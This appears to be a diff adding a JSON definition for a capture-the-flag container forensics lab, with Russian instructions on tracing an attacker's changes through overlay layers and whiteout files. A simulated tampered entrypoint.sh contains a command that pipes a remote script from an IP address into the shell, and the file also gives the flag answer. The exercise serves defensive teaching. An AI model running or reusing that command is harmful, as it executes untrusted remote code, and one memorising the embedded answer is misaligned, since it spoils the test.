@@ -1,0 +1,47 @@
+{
+  "id": "forensics-containers",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{d0ck3r_l4y3r_wh1t30ut_tr4c3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: контейнер `miner`\n\n`overlay/upper` — верхний (записываемый) слой контейнера. Злоумышленник изменил `entrypoint.sh` и удалил файл `secret` (whiteout). Восстанови следы и найди флаг.\n\n1. `docker history miner` — слои.\n2. `find overlay -name \".wh.*\"` — whiteout-маркеры.\n3. `grep -r nto overlay` — изменённые файлы.\n\nФлаг `nto{...}` запиши в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/docker-history.txt",
+      "text": "IMAGE          CREATED        CREATED BY                                      SIZE\na1b2c3d4e5f6   2 hours ago    /bin/sh -c #(nop)  CMD [\"nginx\"]                0B\nb2c3d4e5f6a1   2 hours ago    /bin/sh -c apt-get install -y curl              31MB\nc3d4e5f6a1b2   3 hours ago    /bin/sh -c #(nop) COPY file:8f.. in /app/       2kB\n"
+    },
+    {
+      "path": "/home/student/task/overlay/upper/app/entrypoint.sh",
+      "text": "#!/bin/sh\n# modified by attacker\ncurl -s http://185.199.110.153/p.sh | sh\nexport CAMPAIGN=nto{d0ck3r_l4y3r_wh1t30ut_tr4c3}\nexec nginx -g \"daemon off;\"\n"
+    },
+    {
+      "path": "/home/student/task/overlay/upper/app/.wh.secret",
+      "text": ""
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "overlay2: `lowerdir` (образ, RO) + `upperdir` (изменения, RW). Удаление файла не стирает его из нижнего слоя — создаётся whiteout (`.wh.<имя>`), перекрывающий оригинал. Верхний слой = что сделал контейнер.\n"
+    }
+  ],
+  "tools": {
+    "docker": {
+      "help": "docker history <образ> — слои образа (эмуляция)",
+      "cases": [
+        {
+          "match": "history",
+          "example": "docker history miner",
+          "output": "IMAGE          CREATED        CREATED BY                                      SIZE\na1b2c3d4e5f6   2 hours ago    /bin/sh -c #(nop)  CMD [\"nginx\"]                0B\nb2c3d4e5f6a1   2 hours ago    /bin/sh -c apt-get install -y curl              31MB\n"
+        }
+      ]
+    }
+  }
+}
